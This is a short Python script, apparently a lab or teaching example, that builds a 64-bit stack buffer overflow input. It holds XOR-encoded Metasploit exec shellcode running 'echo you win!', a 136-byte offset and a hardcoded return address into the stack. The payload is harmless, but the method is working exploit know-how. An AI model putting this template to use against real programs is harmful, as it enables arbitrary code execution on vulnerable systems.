#!/usr/bin/env python
#
# Simple 64 bits b0f example
# Little and cute.
#

offset_to_eip = 136 # 128 + 8

# msf > use payload/linux/x64/exec
# msf payload(exec) > generate -o CMD="echo you win!" -t python -b '\x00' 

# linux/x64/exec - 95 bytes
# http://www.metasploit.com
# Encoder: x64/xor
# VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
# PrependSetreuid=false, PrependSetuid=false, 
# PrependSetresgid=false, PrependSetregid=false, 
# PrependSetgid=false, PrependChrootBreak=false, 
# AppendExit=false, CMD=echo you win!

shellcode =  ""
shellcode += "\x48\x31\xc9\x48\x81\xe9\xf9\xff\xff\xff\x48\x8d\x05"
shellcode += "\xef\xff\xff\xff\x48\xbb\x38\xdd\xf9\x78\x7e\xb7\xd7"
shellcode += "\x01\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
shellcode += "\x52\xe6\xa1\xe1\x36\x0c\xf8\x63\x51\xb3\xd6\x0b\x16"
shellcode += "\xb7\x84\x49\xb1\x3a\x91\x55\x1d\xb7\xd7\x49\xb1\x3b"
shellcode += "\xab\x90\x70\xb7\xd7\x01\x5d\xbe\x91\x17\x5e\xce\xb8"
shellcode += "\x74\x18\xaa\x90\x16\x5f\xb7\x81\x56\x70\x54\x1f\x77"
shellcode += "\x7b\xb7\xd7\x01"



# jmp to shellcode at 0x7fffffffdb60
# Note I only write six bytes. The two leading 0x00 bytes
# (64 bit address) are already on the stack.
eip = "\x60\xdb\xff\xff\xff\x7f"

string = shellcode + ("\x24\xFF" * 20) + "\x90" + eip # hardcoded, nasty

print string
